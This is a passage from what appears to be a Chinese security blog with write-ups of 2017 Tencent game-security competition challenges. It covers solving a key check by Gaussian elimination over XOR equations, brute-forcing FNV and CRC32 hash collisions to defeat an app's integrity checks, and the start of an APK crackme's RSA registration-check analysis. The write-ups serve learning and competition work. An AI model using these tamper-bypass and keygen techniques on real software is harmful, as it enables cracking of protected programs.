x41,0x51,0xa9,0xab,0x9e,0x45,0xbe,0x59,0x65,0xb8,0xf0,0x60,0xec,0xe9,0xae,0x61,0xde,0xbb,0x29,0x35,0x3c,0xb4,0x01,0xa4,0x30,0xe5,0x7f,0x7b,0xe0,0x67,0xcc,0x06,0x8c,0xd9,0x77,0xed,0x2e,0x71,0x79,0x7b,0x1e,0x51,0x47,0x26,0x71,0xa9,0x3d,0xcc,0xa3,0x36,0x3c,0xf2,0xb9,0x74,0x39,0xbb,0x91,0x4a,0x8f,0x96,0x83,0xee,0xd7,0x63,0x8f,0xac,0x25,0x39,0x7e,0x6f,0xab&#125;;</div></pre></td></tr></table></figure>
<p>程序将输入的16bytes(也就是128bit)，记为input，buffer的大小是2048bytes，分成了128个128bit，记为x[0]到x[127]，根据之前的运算，input将和x数组进行128次运算，每一次运算生成1bit，一共生成128个bit，即16字节，这16字节就是最后算出来的结果，也是需要比较的结果。</p>
<p>其实是一个128元1次的异或方程组，采用高数中的高斯消元法来求解，这个就算没有学过密码学也会，因为这就是高数中的内容啊，看到这个名字是不是很熟悉？对，就是矩阵化简！对于高数课逃课的同学，关于高斯消元法，给个链接：<br><a href="https://en.wikipedia.org/wiki/Gaussian_elimination" target="_blank" rel="external">https://en.wikipedia.org/wiki/Gaussian_elimination</a><br>这里已经非常详细</p>
<p>然后根据本题目的特征google一下就能搜到不少解该类方程组的模板，选取一个，代码如下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">int Gauss()&#123;  </div><div class="line">    int max_r,col,k;  </div><div class="line">    free_num=0;  </div><div class="line">    for(k=0,col=0;k&lt;equ&amp;&amp;col&lt;var;k++,col++)&#123;  </div><div class="line">        max_r=k;  </div><div class="line">        for(int i=k+1;i&lt;equ;i++)&#123;  </div><div class="line">            <span class="keyword">if</span>(abs(<span class="selector-tag">a</span>[i][col])&gt;abs(<span class="selector-tag">a</span>[max_r][col]))  </div><div class="line">                max_r=i;  </div><div class="line">        &#125;  </div><div class="line">        <span class="keyword">if</span>(<span class="selector-tag">a</span>[max_r][col]==<span class="number">0</span>)&#123;  </div><div class="line">            k--;  </div><div class="line">            free_x[free_num++]=col;  </div><div class="line">            continue;  </div><div class="line">        &#125;  </div><div class="line">        <span class="keyword">if</span>(max_r!=k)&#123;  </div><div class="line">            for(int j=col;j&lt;var+1;j++)  </div><div class="line">                swap(a[k][j],a[max_r][j]);  </div><div class="line">        &#125;  </div><div class="line">        for(int i=k+1;i&lt;equ;i++)&#123;  </div><div class="line">            <span class="keyword">if</span>(<span class="selector-tag">a</span>[i][col]!=<span class="number">0</span>)&#123;  </div><div class="line">                for(int j=col;j&lt;var+1;j++)  </div><div class="line">                    a[i][j]^=a[k][j];  </div><div class="line">            &#125;  </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line"></div><div class="line">    for(int i=k;i&lt;equ;i++)  </div><div class="line">        <span class="keyword">if</span>(<span class="selector-tag">a</span>[i][col]!=<span class="number">0</span>)  </div><div class="line">            return -1;  //无解  </div><div class="line">    printf("you jie k:%d var :%d \n",k,var);</div><div class="line">    if(k&lt;var) return var-k;  //解不唯一，返回解个数  </div><div class="line">    <span class="comment">//解唯一，生成解集  </span></div><div class="line">    for(int i=var-1;i&gt;=0;i--)&#123;  </div><div class="line">        x[i]=a[i][var];  </div><div class="line">        for(int j=i+1;j&lt;var;j++)  </div><div class="line">            x[i]^=(a[i][j]&amp;&amp;x[j]);  </div><div class="line">        printf("%d",x[i] );</div><div class="line">    &#125;  </div><div class="line">    return 0;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>再根据IDA中看到的信息，确认正确答案的前面7字节是”GSLab17”，最后四字节是pid，编写代码如下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">void * zapus_get(void *abc)</div><div class="line">&#123;	int j,k,i;</div><div class="line">	int pid = getpid();</div><div class="line">	LOGI("pid:%d\n",pid );</div><div class="line">	unsigned char key[16]= "GSLab17";</div><div class="line">	unsigned char s[16] = &#123;0&#125;;</div><div class="line">	key[7] = 0;</div><div class="line">	*((int *)key+2)  = 0;</div><div class="line">	*((int *)key+3)  = pid;</div><div class="line"></div><div class="line">	memset(a,0,sizeof(a));  </div><div class="line">    memset(x,0,sizeof(x));  </div><div class="line">	<span class="comment">//***initial  zeng guang ju zhen</span></div><div class="line">	for ( j = 0; (unsigned int) j &lt; 0x80; j++ )</div><div class="line">	&#123;</div><div class="line">		for ( k = 0; (unsigned int) k &lt; 0x80; ++k )</div><div class="line">		&#123;</div><div class="line">			a[j][k] =  (((signed int)(unsigned char)buffer[16 * j + k / 8] &gt;&gt; k % 8) &amp; 1);		</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	for ( k = 0; (unsigned int) k &lt; 0x80; ++k )</div><div class="line">	&#123;</div><div class="line">		a[k][128] =((signed int)*( (unsigned char *) key + k / 8) &gt;&gt; (7 - k % 8) ) &amp; 1;</div><div class="line"></div><div class="line">	&#125;</div><div class="line">    k = Gauss(); </div><div class="line">   </div><div class="line">    for(int i=0;i&lt;128;i++)&#123;  </div><div class="line">            s[i/8] |= x[i] &lt;&lt; (7 - i % 8);</div><div class="line">    &#125; </div><div class="line"></div><div class="line">	LOGI("HELLO I'm here.");</div><div class="line">	memcpy(abc, s, 16);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>再调试看看结果，自己挖了什么坑自己填填坑，即可过第一关，进入下一关。</p>
<h3 id="0x2-孪生兄弟"><a href="#0x2-孪生兄弟" class="headerlink" title="0x2 孪生兄弟"></a>0x2 孪生兄弟</h3><p>接下来来到孪生兄弟把守的最后大关，只要越过这道防线，就可以飞向光明顶。</p>
<p>之所以说它是孪生兄弟，是因为它对程序进行了hash值的校验，而且是两种校验，两个校验值都必须值为0x614C5347，其实就是“GSLa”。</p>
<h4 id="什么是hash函数？"><a href="#什么是hash函数？" class="headerlink" title="什么是hash函数？"></a>什么是hash函数？</h4><p>Hash函数H将可变长度的数据M作为输入，产生固定长度的Hash值h。<br>Hash函数，哈希函数，散列函数，杂凑函数它们说的都是同一个含义，后续我们都称之为Hash函数。</p>
<h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>Hash函数H将可变长度的数据M作为输入，产生固定长度的Hash值h。<br>Hash函数，哈希函数，散列函数，杂凑函数它们说的都是同一个含义，后续我们都称之为Hash函数。<br>h=H(M)</p>
<h4 id="单向性"><a href="#单向性" class="headerlink" title="单向性"></a>单向性</h4><p>给定输入M，通过函数H可以很容易计算出输出h；但如果给定h，则找到M在计算上不可行。</p>
<h4 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a>数据完整性</h4><p>输入数据M中任何1个bit发生变化，都将导致输出M发生很大的变化。</p>
<h4 id="Hash冲突（突破本题的关键）"><a href="#Hash冲突（突破本题的关键）" class="headerlink" title="Hash冲突（突破本题的关键）"></a>Hash冲突（突破本题的关键）</h4><p>在Hash函数中，M称之为h原像,，因为H函数是一个多对一的映射,，对于任意给定的Hash数值h,，可能会有多个原像,，如果满足如下条件, 则称之为发生了哈希碰撞，也就是哈希冲突。<br>    x!=yandH(x)==H(y)<br>一个优良的Hash函数必须满足如下几个性质:</p>
<p>任意y，找x，使得H(x) = y，非常困难<br>给定x1, 找x2, 使得H(x1) == H(x2), 非常困难<br>找任意的x1, x2, 使得H(x1) == H(x2), 非常困难</p>
<p>这里感觉本题是第一条或者第二条，如果是第三条的话（可惜本题并不是），可以参考生日定理来解题，这里放个链接：<br><a href="https://en.wikipedia.org/wiki/Birthday_problem" target="_blank" rel="external">https://en.wikipedia.org/wiki/Birthday_problem</a></p>
<p>介绍完基本概念，言归正传，本题用的两个校验是crc32校验和fnvhash函数校验，这里再给两个链接：<br>crc32：<a href="http://blog.csdn.net/zhaodm/article/details/3711034" target="_blank" rel="external">http://blog.csdn.net/zhaodm/article/details/3711034</a><br>fnvhash：<a href="http://blog.csdn.net/taochenchang/article/details/7319739" target="_blank" rel="external">http://blog.csdn.net/taochenchang/article/details/7319739</a><br>通过分析代码可以得到：<br>1.crc32 校验<br>标准算法没改动过：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">unsigned long calc_crc(unsigned char *<span class="selector-tag">p</span>, unsigned int len)   </div><div class="line">&#123;</div><div class="line">    register unsigned long crc;</div><div class="line">    unsigned int count=0;</div><div class="line"></div><div class="line">    crc = 0xFFFFFFFF;</div><div class="line">    while (count &lt; len)&#123;</div><div class="line">        crc = (crc&gt;&gt;8) ^ crc_table[ (crc^p[count++]) &amp; 0xFF ];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return( crc^0xFFFFFFFF );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>单独改crc32是没问题的，附件里有代码。</p>
<p>2.fnv_hash<br>标准算法没改动过<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">unsigned long calc_fnvhash(unsigned char *<span class="selector-tag">p</span>, unsigned int len)   </div><div class="line">&#123;</div><div class="line">    register unsigned long hash;</div><div class="line">    unsigned int count=0;</div><div class="line"></div><div class="line">    hash = 0x811C9DC5;</div><div class="line">    while (count &lt; len)&#123;</div><div class="line">        hash = 0x1000193 * (p[count++] ^ hash);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return hash;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>因为crc32的值是可以求出来的，再给个链接，其实这篇文章最早在看雪：<br><a href="http://www.cnblogs.com/thinksea/articles/2024199.html" target="_blank" rel="external">http://www.cnblogs.com/thinksea/articles/2024199.html</a><br>所以思路就变成了暴力碰撞fnvhash的值即可。<br>分析完了，写代码进行碰撞，关键代码：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//8字节碰撞 </span></div><div class="line">	</div><div class="line">	unsigned char byte[4] ;</div><div class="line">	unsigned char byte2[4] ;</div><div class="line">	srand( (unsigned) time(NULL) * getpid());</div><div class="line">	long i =0;</div><div class="line">	while(<span class="number">1</span>)</div><div class="line">	&#123;</div><div class="line">		</div><div class="line">		byte[0]=rand()%256 + byte[1] ; </div><div class="line">		byte[1]=rand()%256 + byte[2]; </div><div class="line">		byte[2]=rand()%256 + byte[3]; ; </div><div class="line">		byte[3]=rand()%256 + byte2[0]; ;</div><div class="line">		byte2[0]=rand()%256 + byte2[1];  </div><div class="line">		byte2[1]=rand()%256 + byte2[2];  </div><div class="line">		byte2[2]=rand()%256 + byte2[3]  ; </div><div class="line">		byte2[3]=rand()%256 + byte[0] ;</div><div class="line">		*(unsigned int*)(filemap+offset -4) = *(unsigned int*)byte;</div><div class="line">		*(unsigned int*)(filemap+offset -8) = *(unsigned int*)byte2;</div><div class="line"></div><div class="line">		tweakcrc(filemap, filestat.st_size, crc, offset); //修改crc32 值为固定值</div><div class="line">		fnvhash=calc_fnvhash_op(filemap+filestat.st_size -12, 12);</div><div class="line">	</div><div class="line"></div><div class="line">		<span class="keyword">if</span> (fnvhash  &gt;= <span class="number">0</span>x614C5340 &amp;&amp; fnvhash &lt;= <span class="number">0</span>x614C5349)</div><div class="line">		&#123;</div><div class="line">			printf("$$$$$$$$$$$$$$  near success $$$$$$$$$$$$$\n");</div><div class="line">			printf("%x %x %x %x\n", byte[0],byte[1],byte[2],byte[3]); </div><div class="line">			printf("%x %x %x %x\n", byte2[0],byte2[1],byte2[2],byte2[3]); </div><div class="line">			printf("calc_fnvhash_op: 0x%X\n", fnvhash);</div><div class="line">			printf("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n");</div><div class="line"></div><div class="line">			<span class="keyword">if</span> (fnvhash == <span class="number">0</span>x614C5347)</div><div class="line">			&#123;</div><div class="line">				printf("********************************\n");</div><div class="line">				printf("**************success***********\n");</div><div class="line">				printf("********************************\n");</div><div class="line">			    printf("%x %x %x %x\n", byte[0],byte[1],byte[2],byte[3]); </div><div class="line">				printf("%x %x %x %x\n", byte2[0],byte2[1],byte2[2],byte2[3]); </div><div class="line">				printf("calc_fnvhash_op: 0x%X\n", fnvhash);</div><div class="line">				break;</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">		&#125;</div><div class="line">		i++;</div><div class="line">		if (i % 100000000 == 0)</div><div class="line">		&#123;</div><div class="line">			printf("已经碰撞%ld次 继续努力\n", i);</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>优化后的crc32和fnvhash函数的计算，代码对比如下，这里的值只针对我自己的so进行的优化：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//crc </span></div><div class="line">unsigned long calc_crc(char *<span class="selector-tag">p</span>, unsigned int len)   </div><div class="line">&#123;</div><div class="line">    register unsigned long crc;</div><div class="line">    unsigned int count=0;</div><div class="line"></div><div class="line">    crc = 0xFFFFFFFF;</div><div class="line">    while (count &lt; len)&#123;</div><div class="line">        crc = (crc&gt;&gt;8) ^ crc_table[ (crc^p[count++]) &amp; 0xFF ];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return( crc^0xFFFFFFFF );</div><div class="line">&#125;</div><div class="line">unsigned long calc_crc_op(char *<span class="selector-tag">p</span>, unsigned int len)   </div><div class="line">&#123;</div><div class="line">    register unsigned long crc;</div><div class="line">    unsigned int count=0;</div><div class="line"></div><div class="line">    crc = 0x81820a5b;</div><div class="line">    while (count &lt; len)&#123;</div><div class="line">        crc = (crc&gt;&gt;8) ^ crc_table[ (crc^p[count++]) &amp; 0xFF ];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return( crc^0xFFFFFFFF );</div><div class="line">&#125;</div><div class="line"><span class="comment">//fnvhash</span></div><div class="line">unsigned long calc_fnvhash(unsigned char *<span class="selector-tag">p</span>, unsigned int len)   </div><div class="line">&#123;</div><div class="line">    register unsigned long hash;</div><div class="line">    unsigned int count=0;</div><div class="line"></div><div class="line">    hash = 0x811C9DC5;</div><div class="line">    while (count &lt; len)&#123;</div><div class="line">        hash = 0x1000193 * (p[count++] ^ hash);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return hash;</div><div class="line">&#125;</div><div class="line">unsigned long calc_fnvhash_op(unsigned char *<span class="selector-tag">p</span>, unsigned int len)   </div><div class="line">&#123;</div><div class="line">    register unsigned long hash;</div><div class="line">    unsigned int count=0;</div><div class="line"></div><div class="line">    hash = 0x799362BC;</div><div class="line">    while (count &lt; len)&#123;</div><div class="line">        hash = 0x1000193 * (p[count++] ^ hash);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return hash;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里再说明一下，一开始没有优化算法，导致计算缓慢（被卡了一波，标记，其实也不是没做出来的主要原因，自己挖了个坑，周末一直在挂机，没注意到错误，以为hash碰撞很难，但是过了很久没跑出结果就感觉不太对了，于是我就跟了一下，解决掉大坑，到达胜利光明顶），优化算法后效率提升了大概2100倍，大概1秒钟碰撞1E次，瞬间得出解。跑了大概半分钟，得出4个解（感觉任意指定hash都可以算，然后再感觉一天给任意hash1-2W个解也是没有压力的），如下给出附加bytes：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>.</div><div class="line"><span class="number">9</span>a <span class="number">14</span> <span class="number">7</span> <span class="number">99</span></div><div class="line"><span class="number">56</span> <span class="number">8</span>c <span class="number">8</span> <span class="number">1</span>f</div><div class="line">calc_fnvhash_op: <span class="number">0</span>x614C5347</div><div class="line"><span class="number">2</span>.</div><div class="line"><span class="number">84</span> <span class="number">1</span>e <span class="number">16</span> <span class="number">23</span></div><div class="line"><span class="number">92</span> <span class="number">18</span> <span class="number">3</span>c <span class="number">34</span></div><div class="line">calc_fnvhash_op: <span class="number">0</span>x614C5347</div><div class="line"><span class="number">3</span>.</div><div class="line"><span class="number">5</span>a f5 <span class="number">69</span> <span class="number">0</span></div><div class="line">a0 d1 <span class="number">39</span> <span class="number">29</span></div><div class="line">calc_fnvhash_op: <span class="number">0</span>x614C5347</div><div class="line"><span class="number">4</span>.</div><div class="line"><span class="number">28</span> f0 <span class="number">98</span> <span class="number">98</span></div><div class="line">a1 <span class="number">82</span> b0 e7</div><div class="line">calc_fnvhash_op: <span class="number">0</span>x614C5347</div></pre></td></tr></table></figure>
<p>经过此役，发现hash碰撞很有趣，做题使人快速学习新东西，复习老东西。</p>
<p>谢谢观看，不足之处请看官斧正！</p>
<p>2017.7.15</p>
<p>By Ericky</p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2017/07/08/2017腾讯游戏安全技术竞赛 Round 1 标准及进阶题解分析/">
  <time datetime="2017-07-08T15:00:00.000Z">
    2017-07-08
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2017/07/08/2017腾讯游戏安全技术竞赛 Round 1 标准及进阶题解分析/">2017腾讯游戏安全技术竞赛 Round 1 标准及进阶题解分析</a></h1>
  

  </header>
  
  <div class="entry">
    
      <p>前言</p>
<p>为了学习死磕的精神，我也来做题。我选择了APK的题目，题目有两种难度，分别对应标准级别和进阶级别，标准级别是100分，进阶级别是200分。我先看的标准级别，然后看的进阶级别，由于自己对一些算法的熟练程度不够，逆向东西也逆得慢，所以花了不少时间。再说一点题外话，这个进阶题目和之前360移动安全竞赛的APK cm比较相似，都是RSA算法，name和RSA中的e 、n、 d参数绑定，不同之处是360的那道题目的难点在于用了ollvm来进行混淆，增大分析难度，而这一道题目的难点是需要写一个完整的注册机，这个是两道题的不同之处，好了不扯了，下面开始正题。</p>
<p>0x1REG_CHECK函数<br>Java层比较简单，只是一个reg_check函数，传入输入的key和code，然后进行验证。这个函数是整个程序的核心，reg_check函数如下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">int __fastcall CRegCheck::reg_check(int a1, int a2, _DWORD *a3, int a4)</div><div class="line">&#123;</div><div class="line">  int v4; // r4@1</div><div class="line">  char **v5; // r8@1</div><div class="line">  int v6; // r6@1</div><div class="line">  int v7; // r5@1</div><div class="line">  int v8; // r0@2</div><div class="line">  unsigned int v9; // r4@5</div><div class="line">  int v10; // r4@5</div><div class="line">  void *v11; // r4@6</div><div class="line">  int v13; // [sp+20h] [bp-CD4h]@5</div><div class="line">  void *ptr; // [sp+24h] [bp-CD0h]@2</div><div class="line">  int v15; // [sp+28h] [bp-CCCh]@2</div><div class="line">  int v16; // [sp+2Ch] [bp-CC8h]@2</div><div class="line">  __int64 v17; // [sp+30h] [bp-CC4h]@2</div><div class="line">  __int64 v18; // [sp+38h] [bp-CBCh]@7</div><div class="line">  __int64 v19; // [sp+40h] [bp-CB4h]@7</div><div class="line">  __int64 v20; // [sp+48h] [bp-CACh]@7</div><div class="line">  __int64 v21; // [sp+58h] [bp-C9Ch]@5</div><div class="line">  __int64 v22; // [sp+60h] [bp-C94h]@7</div><div class="line">  int v23; // [sp+68h] [bp-C8Ch]@7</div><div class="line">  int v24; // [sp+CE4h] [bp-10h]@1</div><div class="line"></div><div class="line"></div><div class="line">  v4 = a4;</div><div class="line">  v5 = (char **)a3;</div><div class="line">  v6 = a2;</div><div class="line">  v24 = _stack_chk_guard;</div><div class="line">  v7 = 0;</div><div class="line">  <span class="keyword">if</span> ( CRegCheck::is_user_name_legal(_stack_chk_guard, (int *)a2) != <span class="number">1</span> )</div><div class="line">    goto LABEL_13;</div><div class="line">  v8 = CRegCheck::get_formula_param(&amp;v17, v6);</div><div class="line">  ptr = 0;</div><div class="line">  v15 = 0;</div><div class="line">  v16 = 0;</div><div class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( !CBase64::base64_decode(*v5, (int)&amp;ptr) )</div><div class="line">      goto LABEL_8;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    v9 = CRegCheck::get_rsa_key_seed(v8, v6);</div><div class="line">    RSA::RSA((RSA *)&amp;v21);</div><div class="line">    RSA::RSAKey((RSA *)&amp;v21, v9);</div><div class="line">    sub_33440(&amp;v13, (int *)v5);</div><div class="line">    v10 = RSA::tdecrypto((int)&amp;v21, (int)&amp;v13, (int)&amp;ptr);</div><div class="line">    sub_332FC(v13 - 12);</div><div class="line">    RSA::~RSA((RSA *)&amp;v21);</div><div class="line">    <span class="keyword">if</span> ( !v10 )</div><div class="line">    &#123;</div><div class="line">LABEL_8:</div><div class="line">      v7 = 0;</div><div class="line">      goto LABEL_9;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  v11 = ptr;</div><div class="line">  <span class="keyword">if</span> ( v15 - (_DWORD)ptr == <span class="number">16</span> )</div><div class="line">  &#123;</div><div class="line">    _aeabi_memclr(&amp;v23, 0);</div><div class="line">    _aeabi_memcpy(&amp;v21, v11, 16);</div><div class="line">    v7 = is_tangent(v20, v19, v18, v21, v22, v17);</div><div class="line">LABEL_9:</div><div class="line">    v11 = ptr;</div><div class="line">    goto LABEL_11;</div><div class="line">  &#125;</div><div class="line">  v7 = 0;</div><div class="line">LABEL_11:</div><div class="line">  <span class="keyword">if</span> ( v11 )</div><div class="line">    operator delete(v11);</div><div class="line">LABEL_13:</div><div class="line">  <span class="keyword">if</span> ( _stack_chk_guard != v24 )</div><div class="line">    _stack_chk_fail(_stack_chk_guard - v24);</div><div class="line">  return v7;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>0x2 is_user_name_legal函数</p>
<p>在check函数的开端，遇见的是is_user_name_legal函数，它的作用是校验了一下name的长度是否是39位，格式需要如下：<br>xxxx-xxxx-xxxx-xxxx-xxxx-xxxx-xxxx-xxxx （一共39位，暂且称之为8个段，在之后用segment1～segment8来表示）<br>x需要在 ‘0’-‘9’ 、 ‘a’-‘f’之间，否则key的合法性就不予通过。</p>
<p>0x3 get_formula_param函数</p>
<p>在get_formula_param函数中，根据输入的name 初始化了4个参数，每2个段生成一个参数，这些参数将在最后的is_tangent函数验证中用到。<br>具体参数代码如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">a1 = 0;</div><div class="line">a1 += (segment1[0] * segment8[0]) &lt;&lt; 16 ;</div><div class="line">a1 += segment1[1] ^ segment8[1];</div><div class="line">a1 += segment1[2] % (segment8[2]+1)+ 1;</div><div class="line">a1 += segment1[3] / (segment8[3]+1);</div><div class="line"></div><div class="line"></div><div class="line">a2 =0;</div><div class="line">a2 += (segment2[0] ^ segment7[0]) &lt;&lt; 16 ;</div><div class="line">a2 += (segment2[1] % (segment7[1]+3));</div><div class="line">a2 += (segment2[2] / (segment7[2]+1)) + 5;</div><div class="line">a2 += (segment2[3] + (segment7[3])) ;</div><div class="line">a3 = 0;</div><div class="line">a3 += (segment3[0] / (3 + segment6[0]) )&lt;&lt; 16 ;</div><div class="line">a3 += (segment3[1] * segment6[1]);</div><div class="line">a3 +=  segment3[2] %(segment6[2] + 7) +5;</div><div class="line">a3 +=  segment3[3] + segment6[3];</div><div class="line">a6 = 0;</div><div class="line">a6 += (segment4[0] + segment5[0]) &lt;&lt; 16;</div><div class="line">a6 *= segment4[1]/(segment5[1]+2);</div><div class="line">a6 += segment4[2] %(segment5[2] +5) +7;</div><div class="line">a6 += segment4[3] * segment5[3];</div></pre></td></tr></table></figure>
<p>好了，这就是最后校验用到的4个参数。</p>
<p>0x4 分水岭 (标准OR进阶？)</p>
